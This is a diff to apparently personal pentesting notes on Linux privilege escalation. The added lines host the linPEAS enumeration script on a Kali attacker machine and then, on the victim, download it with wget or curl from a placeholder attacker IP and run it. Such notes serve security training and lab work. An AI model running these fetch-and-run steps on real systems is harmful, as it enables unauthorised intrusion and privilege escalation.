@@ -2,9 +2,26 @@
 Use Linpeas if possible
 
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
-
 Alternative enumeration script: https://github.com/diego-treitos/linux-smart-enumeration/tree/master
 
+On the attacker host:
+```
+# determine IP address of Kali
+ip a
+
+# create python webserver in the directory where linpeass are located
+python -m http.server 8080
+```
+From the victim host
+```
+
+#Either of the below
+wget http://<KALI IP>:8080/linpeas.sh
+curl --output linpeas.sh http://<KALI IP>:8080/linpeas.sh
+
+chmod +x linpeas.sh
+./linpeas.sh
+```
 ## Basic
 Check if you can become root without password
 ```
